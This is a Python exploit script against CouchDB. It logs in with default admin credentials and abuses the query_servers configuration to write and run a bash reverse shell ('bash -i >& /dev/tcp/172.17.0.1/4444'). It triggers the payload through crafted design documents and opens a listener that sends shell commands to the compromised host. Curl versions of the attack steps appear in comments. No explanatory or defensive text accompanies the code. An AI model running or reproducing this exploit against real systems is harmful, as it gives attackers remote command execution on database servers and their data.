import socket
from threading import Thread
import requests


def read_all(conn):
    line = ""
    while True:
        line += conn.recv(1024).decode()
        if line.strip().endswith("#"):
            break
    return line


def open_reverse_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 4444))
        s.listen(1)
        conn, _ = s.accept()
        print(read_all(conn))
        conn.send(b"ls\n")
        results = read_all(conn)
        print(results)
        conn.send(b"exit\n")
        conn.shutdown(0)


if __name__ == '__main__':
    user = "admin"
    password = "admin"

    url = "localhost:5984"
    full_path = "http://%s:%s@%s" % (user, password, url)

    # Create DB
    requests.put(full_path + "/god")
    requests.put(full_path + "/god/zero", data='{"_id": "HTP"}')

    # Create commands for reverse shell
    # curl -X PUT http://admin:admin@localhost:5984/_node/nonode@nohost/_config/query_servers/cmd_create -d '"echo \"bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\" > run.sh"'
    # try to remove the the first line
    requests.put(full_path + "/_node/nonode@nohost/_config/query_servers/cmd_create", data='"echo -e \'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\' > run.sh"')
    requests.put(full_path + "/_node/nonode@nohost/_config/query_servers/cmd_exec", data='"bash run.sh"')

    Thread(target=open_reverse_listener).start()

    # execute the reverse shell
    # curl -X PUT http://admin:admin@localhost:5984/god/_design/zero -d '{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd"}'
    requests.put(full_path + "/god/_design/zero", data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd_create"}')
    try:
        requests.put(full_path + "/god/_design/zero", data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd_exec"}', timeout=1)
    except requests.exceptions.ReadTimeout:
        print("Command probably worked")
